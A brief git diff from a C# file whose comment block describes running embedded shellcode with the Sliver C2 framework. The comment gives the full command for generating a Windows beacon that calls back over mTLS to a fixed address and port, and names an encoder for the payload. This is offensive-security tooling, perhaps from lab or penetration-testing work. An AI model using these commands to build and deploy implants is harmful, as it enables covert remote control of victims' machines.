@@ -4,7 +4,7 @@ using System.Reflection;
 using System.Runtime.InteropServices;
 
 
-/* 04-04-24 - Working
+/* 
  * Running local shellcode as an embedded reference with Sliver C2
  * generate --mtls 192.168.45.221:8888 --os windows --arch amd64 --format shellcode --save beacon.bin
  * run that bin file through the encoder https://github.com/0xG00S3/Payload-Encoder
